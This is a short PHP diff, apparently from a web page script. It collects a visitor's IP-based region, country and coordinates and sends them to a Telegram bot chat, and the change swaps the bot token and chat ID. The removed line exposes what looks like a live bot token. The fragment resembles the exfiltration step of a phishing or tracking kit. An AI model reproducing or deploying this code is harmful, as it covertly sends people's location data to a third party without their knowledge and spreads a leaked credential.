@@ -45,7 +45,7 @@ $ipAddress = $userIP;
      $msg .= "Region: {$data->regionName}\n";
      $msg .= "Country: {$data->country}\n";
      $msg .="Location: {$data->lat}, {$data->lon}\n";
-     file_get_contents("https://api.telegram.org/bot8712281940:AAF7RQkUscdeFPocXnJj8-Db7sxeU4L2AiU/sendMessage?chat_id=-5296860240&text=".urlencode($msg)."" );
+     file_get_contents("https://api.telegram.org/bot8bhjbhjQrHbg/sendMessage?chat_id=-79878979&text=".urlencode($msg)."" );
 
 	}else{
 		
